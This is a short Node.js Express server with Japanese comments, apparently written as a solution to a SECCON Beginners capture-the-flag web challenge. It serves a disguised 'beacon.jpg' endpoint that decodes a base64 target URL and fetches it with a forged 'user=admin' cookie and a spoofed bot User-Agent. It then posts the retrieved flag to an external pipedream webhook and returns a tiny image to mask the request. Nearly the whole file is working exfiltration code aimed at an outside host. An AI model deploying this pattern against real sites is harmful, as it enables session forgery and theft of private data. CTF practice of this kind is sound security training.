import express from 'express';
import fetch from 'node-fetch';
import { Buffer } from 'buffer';

const app = express();
const PORT = process.env.PORT || 8080;

const WEBHOOK_URL = 'https://eoa0a3qqgsiiqb4.m.pipedream.net';

app.get('/beacon.jpg/:b64url', async (req, res) => {
  try {
    // Base64デコードしてURLを取得
    let target = Buffer.from(req.params.b64url, 'base64').toString();

    // 127.0.0.1やlocalhostを外部アクセス可能なFQDNに置換
    // ※ /flag へのアクセスはここが重要
    target = target
      .replace('127.0.0.1:50000', 'memo4b.challenges.beginners.seccon.jp:50000')
      .replace('localhost:50000', 'memo4b.challenges.beginners.seccon.jp:50000');

    const urlObj = new URL(target);

    const flagRes = await fetch(target, {
      headers: {
        // admin権限付与のcookie
        cookie: 'user=admin',
        // Hostヘッダーは必須の場合が多い
        Host: urlObj.host,
        // botっぽくUser-Agent偽装
        'User-Agent': 'Mozilla/5.0 (compatible; AdminBot/1.0)',
      },
    });

    if (!flagRes.ok) {
      console.error(`[beacon-path] fetch failed: ${flagRes.status} ${flagRes.statusText}`);
      return res.status(500).send('Failed to fetch target URL');
    }

    const flagText = await flagRes.text();

    // Webhookにフラグテキストを送信
    const webhookRes = await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: flagText,
      headers: { 'Content-Type': 'text/plain' },
    });

    if (!webhookRes.ok) {
      const text = await webhookRes.text();
      console.error(`[beacon-path] webhook post failed: ${webhookRes.status} ${webhookRes.statusText} - ${text}`);
      return res.status(500).send('Webhook post failed');
    }

    // 透明な1x1 GIFを返す（imgタグ用）
    const transparentGif = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADElEQVR42mP8z/C/HwAFAgH/YOEGiQAAAABJRU5ErkJggg==',
      'base64'
    );

    res.setHeader('Content-Type', 'image/png');
    res.send(transparentGif);

  } catch (err) {
    console.error('[beacon-path] error:', err);
    res.status(500).send('error');
  }
});

app.listen(PORT, () => {
  console.log(`Proxy server running on port ${PORT}`);
});
